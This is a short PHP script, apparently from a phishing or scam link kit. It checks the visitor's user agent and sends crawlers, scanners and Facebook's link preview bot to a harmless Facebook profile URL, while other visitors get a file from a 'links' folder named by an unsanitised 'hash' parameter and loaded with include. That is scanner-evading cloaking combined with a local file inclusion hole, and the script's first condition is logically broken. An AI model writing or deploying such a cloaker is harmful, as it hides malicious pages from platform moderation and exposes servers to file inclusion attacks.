<?php

if (!isset($_GET['hash']) && file_exists('links/' . $_GET['hash']))
   {
    $short_urlx1 = "http://m.facebook.com/profile.php";
    header("location: $short_urlx1", true, 200);
    die();
    }

    else
    {
	    
   if (preg_match('/bot|crawl|curl|dataprovider|search|get|spider|find|java|majesticsEO|google|yahoo|teoma|contaxe|yandex|libwww-perl|facebookexternalhit|facebook(external)/i', $_SERVER['HTTP_USER_AGENT'])) {
        $short_urlx2 = "http://m.facebook.com/profile.php";
        header("location: $short_urlx2", true, 200);
        die();
    }	    
	    

    else
    {
        include ('links/' . $_GET['hash']);
    }

}
?>
